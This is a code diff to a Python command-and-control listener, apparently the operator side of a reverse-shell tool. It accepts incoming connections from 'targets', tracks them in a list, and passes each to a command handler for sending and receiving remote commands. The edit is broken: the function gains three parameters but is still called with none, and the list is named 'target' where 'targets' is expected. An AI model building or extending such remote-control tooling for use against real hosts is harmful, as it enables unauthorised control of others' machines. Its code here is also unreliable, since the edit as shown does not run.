@@ -20,11 +20,15 @@ def comm_in(remote_target):
 def comm_out(remote_target, message):
     remote_target.send(message.encode())
 
-def listener_handler():
+def listener_handler(host_ip, host_port, targets):
     sock.bind((host_ip, host_port))
     print('[+] Awaiting connection from client...')
     sock.listen()
     remote_target, remote_ip = sock.accept()
+    targets.append([remote_target, remote_ip])
+    print(targets)
+    print((targets[0])[0])
+    print((targets[0])[1])
     comm_handler(remote_target, remote_ip)
 
 def comm_handler(remote_target, remote_ip):
@@ -54,6 +58,7 @@ def comm_handler(remote_target, remote_ip):
             break
 
 if __name__ == '__main__':
+    target = []
     banner()
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
@@ -61,6 +66,6 @@ if __name__ == '__main__':
         host_port = int(sys.argv[2])
         listener_handler()
     except IndexError:
-        print('[-] Command line arguement(s) missing. Please specify IP and Port.')
+        print('\n[-] Command line arguement(s) missing. Please specify IP and Port.')
     except Exception as e:
         print(e)
